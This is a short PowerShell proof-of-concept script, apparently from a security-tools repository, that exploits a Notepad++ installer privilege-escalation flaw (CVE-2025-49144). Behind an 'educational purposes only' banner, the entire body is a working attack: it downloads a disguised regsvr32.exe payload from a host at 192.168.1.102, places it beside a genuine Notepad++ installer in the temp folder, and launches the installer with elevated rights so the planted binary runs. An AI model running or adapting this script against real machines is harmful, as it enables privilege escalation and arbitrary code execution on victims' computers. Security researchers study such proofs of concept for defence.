# -------------------------------------------------------------------------
# SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
# This script is part of the BugWare repository, a collection of security tools
# and PoCs for learning about attack vectors.
# DO NOT USE THIS FOR ILLEGAL PURPOSES.
# -------------------------------------------------------------------------

# Attempt to Exploit Notepad++ Installer Vulnerability to Gain Elevated Privileges
# Vulnerability Reference: CVE-2025-49144

if (Test-Path "C:\Users\$env:USERNAME\regsvr32.exe") {
    exit 1
}

$payloadUrl = "http://192.168.1.102:8080/payloads/regsvr32.exe"
$LocalTempDir = $env:TEMP
$downloadUrl = "https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.8.1/npp.8.8.1.Installer.x64.exe"
Invoke-RestMethod $downloadUrl -OutFile "$LocalTempDir\npp.exe"
Invoke-WebRequest -Uri $payloadUrl -OutFile "$LocalTempDir\regsvr32.exe"
Start-Process "$LocalTempDir\npp.exe" -ArgumentList "/S" -Verb runas -Wait -PassThru
Start-Sleep -Seconds 5
exit 0

